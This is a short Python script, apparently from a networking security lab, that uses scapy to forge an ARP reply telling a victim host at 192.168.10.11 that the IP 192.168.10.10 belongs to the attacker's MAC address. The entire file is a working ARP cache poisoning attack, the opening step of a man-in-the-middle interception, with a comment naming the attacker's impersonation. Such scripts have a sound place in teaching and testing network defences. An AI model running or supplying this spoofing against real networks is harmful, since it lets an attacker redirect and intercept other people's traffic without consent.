#!/usr/bin/env python3
from scapy.all import *

IP_VIC = "192.168.10.11"
MAC_VIC_REAL = "a2:aa:0c:0a:12:61"

IP_TARGET = "192.168.10.10"         # who attacker is pretending to be
MAC_ATTACKER = "92:be:1b:62:b4:c0"     

ether = Ether(src = MAC_ATTACKER, dst = MAC_VIC_REAL)
arp = ARP(psrc = IP_TARGET, hwsrc = MAC_ATTACKER, pdst = IP_VIC, hwdst = MAC_VIC_REAL)

arp.op = 2  # operation code (1 arp request) (2 arp reply)

frame = ether/arp
sendp(frame)

